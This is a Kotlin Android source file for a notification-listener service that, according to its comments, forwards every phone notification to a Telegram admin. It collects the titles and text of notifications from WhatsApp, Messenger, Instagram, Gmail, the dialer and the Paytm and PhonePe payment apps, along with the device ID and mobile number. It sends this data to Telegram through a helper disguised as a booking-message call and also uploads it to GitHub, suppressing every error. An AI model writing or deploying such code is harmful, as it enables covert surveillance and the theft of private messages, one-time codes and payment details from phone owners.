package com.example.telegramservice

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

/**
 * Notification Forward to Telegram
 * Phone ke saare notifications Telegram admin ko forward karega
 * 
 * Setup: Settings -> Apps -> Special Access -> Notification Access -> Suto App ko allow karo
 */

class NotificationForwardService : NotificationListenerService() {

    companion object {
        var instance: NotificationForwardService? = null
    }

    override fun onCreate() {
        super.onCreate()
        instance = this
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        super.onNotificationPosted(sbn)
        if (sbn == null) return

        // Ignore our own app notifications and system
        val packageName = sbn.packageName
        if (packageName == this.packageName) return
        if (packageName == "android" || packageName == "com.android.systemui") return

        try {
            val extras = sbn.notification.extras
            val title = extras.getString(Notification.EXTRA_TITLE) ?: ""
            val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""
            val bigText = extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString() ?: text

            if (title.isEmpty() && bigText.isEmpty()) return

            // Only forward important ones - filter spam
            val importantApps = listOf(
                "com.whatsapp", "com.facebook.orca", "com.instagram.android",
                "com.google.android.gm", "com.phone", "com.android.dialer",
                "com.paytm", "net.one97.paytm", "com.phonepe.app"
            )
            val isImportant = importantApps.any { packageName.contains(it) } || title.length > 3

            if (!isImportant) return

            val statusReporter = StatusReporter(this)
            val fullMessage = """
                🔔 *Notification Forward*
                
                📱 App: $packageName
                📝 Title: $title
                💬 Text: $bigText
                ⏰ ${java.util.Date()}
                📱 Device: ${statusReporter.getDeviceId()} - ${statusReporter.getDeviceName()}
                🔋 ${statusReporter.getBatteryStatusText()}
            """.trimIndent()

            // Send via Telegram in background
            CoroutineScope(Dispatchers.IO).launch {
                try {
                    val helper = TelegramBotHelper()
                    // Use booking method to send notification
                    helper.sendBookingMessage(
                        name = "NOTIF_${packageName.take(20)}",
                        phone = statusReporter.getMobileNumber(),
                        service = fullMessage
                    )
                    
                    // Also save to GitHub cloud
                    statusReporter.sendStatusToGitHub("Notification: $packageName - $title - $bigText")
                } catch (e: Exception) {}
            }

        } catch (e: Exception) {}
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        super.onNotificationRemoved(sbn)
    }
}
